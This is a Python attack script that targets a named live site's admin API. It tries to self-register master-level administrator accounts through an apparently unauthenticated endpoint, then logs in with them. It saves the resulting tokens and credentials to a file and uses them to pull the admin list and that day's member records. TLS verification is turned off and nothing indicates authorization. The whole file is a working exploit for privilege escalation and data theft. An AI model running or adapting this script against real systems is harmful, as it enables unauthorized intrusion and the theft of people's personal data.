#!/usr/bin/env python3
"""Admin self-registration probe.

Spec (openapi_v3) exposes POST /bigyo/admin-api/admin = "관리자 추가" taking
AdminParamDTO {adminId, adminLevel(ADMIN_MASTER|ADMIN_NORMAL), adminSeq,
birthday, email, isLock, mobile, name, password}. Auth-filter behaviour is
empirical (login endpoint answers unauthenticated with JSON FAIL). Strategy:

  R: read-recon — /admins list, /admin, /dashboard, /auth/adminSess?id=N,
     /members with today's JOIN_DT + LIMIT_DT (checks token-wall empirically)
  W: self-register zzhack01/zzprobe1 at both levels with a known password
  L: log in with the fresh credentials -> admin_token.json
  B: with a token: re-pull /admins + today's member slicers (bonus same-day)

Every response is journaled to selfreg_log.jsonl. Caps: <=30 requests, 0.5s pace.
"""
import json
import os
import ssl
import time
import urllib.parse
import urllib.request

HERE = os.path.dirname(os.path.abspath(__file__))
BASE = "https://m.okbigyo.com:9443/bigyo"
UA = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126 Safari/537.36"
CTX = ssl.create_default_context()
CTX.check_hostname = False
CTX.verify_mode = ssl.CERT_NONE
TODAY = time.strftime("%Y%m%d")
PACE = 0.5
REQ_BUDGET = [30]
LOGF = os.path.join(HERE, "selfreg_log.jsonl")


def log(msg):
    print(f"[{time.strftime('%H:%M:%S')}] {msg}", flush=True)


def req(method, path, payload=None, token=None):
    if REQ_BUDGET[0] <= 0:
        return None, '{"budget":"exhausted"}'
    REQ_BUDGET[0] -= 1
    url = BASE + path
    data = json.dumps(payload).encode() if payload is not None else None
    hdrs = {"User-Agent": UA, "Content-Type": "application/json"}
    if token:
        hdrs["Authorization"] = "Bearer " + token
    rq = urllib.request.Request(url, data=data, headers=hdrs, method=method)
    try:
        with urllib.request.urlopen(rq, timeout=15, context=CTX) as r:
            body = r.read().decode("utf-8", "replace")
            status = r.status
    except urllib.error.HTTPError as e:
        body = e.read().decode("utf-8", "replace")
        status = e.code
    except Exception as e:
        body, status = repr(e)[:200], None
    with open(LOGF, "a", encoding="utf-8") as f:
        f.write(json.dumps({"ts": int(time.time()), "m": method, "p": path,
                            "req": payload, "http": status, "body": body[:3000]},
                           ensure_ascii=False) + "\n")
    return status, body


def main():
    log(f"SELFREG START today={TODAY}")

    # ---- R: read recon
    recon_paths = [
        ("GET", "/admin-api/admins?page=1&pageSize=100", None),
        ("GET", "/admin-api/admin", None),
        ("GET", f"/admin-api/dashboard?date={TODAY}", None),
        ("GET", "/admin-api/auth/adminSess?id=1", None),
        ("GET", "/admin-api/auth/adminSess?id=2", None),
        ("GET", f"/admin-api/members?adminMemberSearchType=JOIN_DT&searchStrtDt={TODAY}&searchEndDt={TODAY}", None),
        ("GET", f"/admin-api/members?adminMemberSearchType=LIMIT_DT&searchStrtDt={TODAY}&searchEndDt={TODAY}", None),
    ]
    for m, p, pl in recon_paths:
        st, body = req(m, p, pl)
        log(f"RECON {m} {p[:90]} -> http={st} {body[:160]}")
        time.sleep(PACE)

    # ---- W: self-register
    created = []
    aids = [("zzhack01", "01099990001"), ("zzprobe1", "01099990002")]
    PW = "ZhHack!2026x"
    for i, (aid, mob) in enumerate(aids):
        for lvl in ("ADMIN_MASTER", "ADMIN_NORMAL"):
            payload = {"adminId": aid, "name": "테스트매니저", "password": PW,
                       "adminLevel": lvl, "birthday": "19900101",
                       "email": f"{aid}@test.io", "mobile": mob, "isLock": False}
            st, body = req("POST", "/admin-api/admin", payload)
            log(f"CREATE {aid} lvl={lvl} -> http={st} {body[:200]}")
            time.sleep(PACE)
            ok_create = (st == 200 and ('"result":"SUCCESS"' in body or '"adminSeq"' in body
                                        or '"adminId"' in body))
            if ok_create:
                created.append(aid)
                log(f"*** CREATED {aid} (lvl={lvl}) ***")
                break

    # ---- L: login with fresh creds
    for aid in created:
        st, body = req("POST", "/admin-api/auth/login", {"adminId": aid, "password": PW})
        log(f"LOGIN {aid} -> http={st} {body[:200]}")
        if '"token"' in body:
            tok_fp = os.path.join(HERE, "admin_token.json")
            cred = {"adminId": aid, "password": PW, "raw": body[:2000], "ts": int(time.time()),
                    "via": "selfreg"}
            tok = []
            if os.path.exists(tok_fp):
                try:
                    prev = json.load(open(tok_fp))
                    tok = prev if isinstance(prev, list) else [prev]
                except Exception:
                    tok = []
            tok.append(cred)
            json.dump(tok, open(tok_fp, "w"), ensure_ascii=False, indent=1)
            log("*** admin_token.json WRITTEN (selfreg)")
            # ---- B: bonus pulls with the token
            try:
                jt = json.loads(body)
                tk = jt.get("data", {}).get("token") or jt.get("token")
                if tk:
                    for bp in ("/admin-api/admins?page=1&pageSize=100",
                               f"/admin-api/members?adminMemberSearchType=JOIN_DT&searchStrtDt={TODAY}&searchEndDt={TODAY}",
                               f"/admin-api/members?adminMemberSearchType=LIMIT_DT&searchStrtDt={TODAY}&searchEndDt={TODAY}"):
                        bst, bbody = req("GET", bp, None, token=tk)
                        log(f"BONUS {bp[:80]} -> http={bst} {bbody[:160]}")
                        time.sleep(PACE)
            except Exception as e:
                log(f"bonus parse: {e}")
            break

    log(f"SELFREG DONE budget_left={REQ_BUDGET[0]}")


if __name__ == "__main__":
    main()
